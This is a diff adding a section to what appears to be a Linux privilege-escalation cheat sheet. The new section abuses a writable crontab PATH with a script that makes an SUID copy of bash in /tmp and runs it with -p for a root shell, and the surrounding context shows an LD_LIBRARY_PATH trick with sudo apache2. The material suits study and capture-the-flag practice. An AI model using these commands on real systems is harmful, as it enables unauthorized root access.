@@ -277,3 +277,19 @@ Run `apache2` using `sudo`, while setting the `LD_LIBRARY_PATH` environment vari
 sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
+## Crontab Path Variable
+
+- If we get path variable in the crontab we can do the below process
+
+1. At first create a file that has `.sh` extension and add the below payload to the file
+#### Script
+```sh
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+2. `chmod +x /home/user/overwrite.sh`
+3. `/tmp/rootbash -p`
+
+- **And you will get the root!!**
